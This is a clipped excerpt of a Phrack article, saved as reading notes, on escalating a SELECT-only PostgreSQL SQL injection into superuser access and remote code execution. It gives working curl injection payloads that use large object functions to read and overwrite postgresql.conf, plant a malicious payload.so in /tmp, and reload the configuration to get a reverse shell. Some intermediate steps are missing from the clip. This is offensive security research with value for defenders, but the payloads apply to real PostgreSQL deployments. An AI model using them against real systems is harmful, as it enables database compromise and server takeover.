---
author: phrack.org
aliases:
  - ".:: Phrack Magazine ::."
tags:
  - readwise/articles
url: https://phrack.org/issues/71/8#article?__readwiseLocation=
date: 2025-04-24
---
# .:: Phrack Magazine ::.

## Intro

This article tells the story of how a failed attempt to exploit a basic [SQL Injection](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/SQL%20Injection.md) in a web API with the [PostgreSQL](../../Dev,%20ICT%20&%20Cybersec/Services/PostgreSQL.md) DBMS quickly spiraled into 3 months of researching database source code and (hopefully) helping to create several new techniques to pwn Postgres hosts in restrictive contexts. [](https://read.readwise.io/read/01jh5acztbaeh79tf3yr8gpwv0)

The target web app was written in the Golang Gin[0] framework and used PGX[1] as a DB driver. What is interesting about the application is the fact that it is a trusted public data repository - anyone can query all data. The updates, however, are limited to a trusted set of users. This means that getting a SELECT SQL injection will have no impact on the application, while DELETE and UPDATE ones will still be critical. [](https://read.readwise.io/read/01jh5adgz4rfa893pzx8rxm9wk)

It turns out that the PGX developers decided to **secure** driver use by converting any SQL query to a prepared statement under the hood. [](https://read.readwise.io/read/01jh5af6s2ezx2xx9m0rw67ver)

So, we are suddenly constrained to a single SELECT query! The DBMS will reject any stacked queries, and nested UPDATE or DELETE queries are also prohibited by the SQL syntax. [](https://read.readwise.io/read/01jh5aheb1yv7z0zj6rfjx5txm)

## Abusing server-side lo_ functions 

Not all hope is lost, though! Since nested SELECT SQL queries are allowed, we can try to call some of the built-in PostgreSQL functions and see if there are any that can help us.

PostgreSQL has several functions that allow reading files from and writing to the server running the DBMS. These functions[4] are a part of the PostgreSQL **Large Objects functionality**, and should be accessible to the superusers by default: 
1. `lo_import(path_to_file, lo_id)` - read the file into the DB large object 
2. `lo_export(lo_id, path_to_file)` - dump the large object into a file 

What files can be read? [](https://read.readwise.io/read/01jh5ajngmrjx5zhq4j3ryp40e)

```sh
$ cat /etc/passwd | grep postgres
postgres:x:129:129::/var/lib/postgresql:/bin/bash

$ find / -uid 129 -type f -perm -600 2>/dev/null
...
/var/lib/postgresql/data/postgresql.conf       <---- main service config
/var/lib/postgresql/data/pg_hba.conf           <---- authentication config
/var/lib/postgresql/data/pg_ident.conf         <---- psql username mapping
...
/var/lib/postgresql/13/main/base/1/2654        <---- some data files
/var/lib/postgresql/13/main/base/1/2613
```

There already is an RCE technique, initially discovered by Denis Andzakovic[5] and sylsTyping[6] in 2021 and 2022, which takes advantage of the `postgresql.conf` file. It involves overwriting the config file and either waiting for the server to reboot or forcefully reloading the configuration via the `pg_reload_conf()` PostgreSQL function[7]. [](https://read.readwise.io/read/01jh5aknr4pdb95m0x1a0abd4f)

```sh
$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
"id=-1 UNION SELECT 1337, CAST((SELECT lo_import('/var/lib/postgresql/data/postgresql.conf', 31337)) AS text)"
[
{"id":1337,"text":"31337"}
]

$ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \
"id=-1 UNION SELECT 1337, CAST((SELECT lo_get(31337)) AS text)"
[
{"id":1337,"text":"\\x23202d2d2d...72650a"}
]
```

Our test user has explicit permissions over the large object functions but lacks access to anything else. [](https://read.readwise.io/read/01jh5apdd1yg14kgmcb3zfc4wy)

## Looking for a privesc

If we want to perform RCE through the configuration file reliably, we must find a way to become a superuser and call `pg_reload_conf()`. Unlike the popular topic of PostgreSQL RCE techniques, there is not a whole lot of information about privilege escalation from within the DB. 

Luckily for us, the official documentation page for Large Object functions gives us some clues for the next steps[4]:
> It is possible to GRANT use of the server-side `lo_import` and `lo_export` functions to non-superusers, but careful consideration of the security implications is required. A malicious user of such privileges could easily parlay them into becoming superuser (for example by rewriting server configuration files) 

What if we were to modify the PostgreSQL table data directly, on disk, without any UPDATE queries at all? [](https://read.readwise.io/read/01jh5ar45ds08dwrcve7nagmxn)

## Identifying target table 

So, we are looking to escalate our permissions to those of a DBMS superuser. Which table should we aim to modify? 
All Postgres permissions are stored in the internal table "pg_authid". All CREATE/DROP/ALTER statements for new roles and users actually modify this table under the hood. [](https://read.readwise.io/read/01jh5axmdxq6pvg91jdhacp3px)

To become a superuser, we must flip all boolean fields to True for our user, "poc_user". [](https://read.readwise.io/read/01jh5ay8t930bczk4xpvdq5a33)

## Flushing Hot storage 

So, you may be wondering - how can we force the server to clean the RAM cache? How about creating a Large Object of a size matching the entire cache pool? :DDDDD [](https://read.readwise.io/read/01jh5b1bh1j1t5s0webbqdzckp)

The server took at least 5 seconds to process our query, which may indicate our success. Let's check our permissions again: [](https://read.readwise.io/read/01jh5b1rm8ea50g8phmfgwe6bh)
Success! All "rol" flags were flipped to true! Can we reload the config now? [](https://read.readwise.io/read/01jh5b1wy4y2b8v13qhe7drqmk)

## SELECT-only RCE 
## Reading original postgresql.conf [](https://read.readwise.io/read/01jh5b3rbp110hdh7gprgadahy)

### Choosing a parameter to exploit 

There are several known options that can already be used for an RCE: - ssl_passphrase_command (by Denis Andzakovic[5]) - archive_command (by sylsTyping[6]) But are any other parameters worth looking into? [](https://read.readwise.io/read/01jh5b5ack7j91sxj6gz4q4xv2)


-------------------------------------------------------------------------- $ cat postgresql.conf ... # - Shared Library Preloading - #local_preload_libraries = '' #session_preload_libraries = '' #shared_preload_libraries = '' # (change requires restart) ... # - Other Defaults - #dynamic_library_path = '$libdir' -------------------------------------------------------------------------- These parameters specify libraries to be loaded dynamically by the DBMS from the path specified in the "dynamic_library_path" variable, under specific conditions. That sounds promising! We will focus on the "session_preload_libraries" variable, which dictates what libraries should be preloaded by the server on a new connection[11]. It does not require a restart of the server, unlike "shared_preload_libraries", and does not have a specific prefix prepended to the path like the "local_preload_libraries" variable. So, we can rewrite the malicious postgresql.conf to have a writable directory in the "dynamic_library_path", e.g. /tmp, and to have a rogue library filename in the "shared_preload_libraries", e.g. "payload.so". [](https://read.readwise.io/read/01jh5b7gm1119p3kmjwjq00jg0)



---[ 4.3 - Uploading the config and library to the server [](https://read.readwise.io/read/01jh5b86gyx9mkpydx5dxqs2dt)



-------------------------------------------------------------------------- $ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \ "id=-1 UNION SELECT 1337,CAST((SELECT lo_from_bytea(3331333337, decode('$(base64 -w 0 postgresql_new.conf)', 'base64'))) AS text)" [ {"id":1337,"text":"3331333337"} ] $ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \ "id=-1 UNION SELECT 1337,CAST((SELECT lo_export(3331333337, '/etc/postgresql/13/main/postgresql.conf')) AS text)" [{"id":1337,"text":"1"}] -------------------------------------------------------------------------- Uploading the malicious .so file: -------------------------------------------------------------------------- $ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \ "id=-1 UNION SELECT 1337,CAST((SELECT lo_from_bytea(33313333337, decode('$(base64 -w 0 payload.so)', 'base64'))) AS text)" [ {"id":1337,"text":"33313333337"} ] $ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \ "id=-1 UNION SELECT 1337,CAST((SELECT lo_export(33313333337, '/tmp/payload.so')) AS text)" [{"id":1337,"text":"1"}] -------------------------------------------------------------------------- [](https://read.readwise.io/read/01jh5b8dwa405d8zy77qfz01ds)



---[ 4.4 - Reload successful We are all set. Now for the moment of glory! A quick config reload and we get a reverse shell back from the server. -------------------------------------------------------------------------- $ curl -G "http://172.23.16.127:8000/phrases" --data-urlencode \ "id=-1 UNION SELECT 1337, CAST((SELECT pg_reload_conf()) AS text)" [ {"id":1337,"text":"true"} ] -------------------------------------------------------------------------- [](https://read.readwise.io/read/01jh5b8zd7fs8zxacrhndxxhvy)



--[ 5 - Conclusions In this article, we managed to escalate the impact of a seemingly very restricted SQL injection to a critical level by recreating DELETE and UPDATE statements from scratch via the direct modification of the DBMS files and data, and develop a novel technique of escalating user permissions! [](https://read.readwise.io/read/01jh5b9g0s279z16da5r83mc5f)



--[ 6 - References [0] https://github.com/gin-gonic/gin [1] https://github.com/jackc/pgx [2] https://github.com/jackc/pgx/issues/1090 [3] https://github.com/postgres/postgres/blob/2346df6fc373df9c5ab944eebecf7d3036d727de/src/backend/tcop/postgres.c#L1468 [4] https://www.postgresql.org/docs/current/lo-funcs.html [5] https://pulsesecurity.co.nz/articles/postgres-sqli [6] https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3 [7] https://www.postgresql.org/docs/9.4/functions-admin.html [8] https://www.postgresql.org/docs/current/storage-hot.html [9] https://www.postgresql.org/docs/current/storage-page-layout.html [10] https://github.com/adeadfed/postgresql-filenode-editor [11] https://postgresqlco.nf/doc/en/param/session_preload_libraries/ [12] https://www.manniwood.com/2020_12_21/read_pg_from_go.html [](https://read.readwise.io/read/01jh5b9pqgs4ee2vw5rcnz61qm)

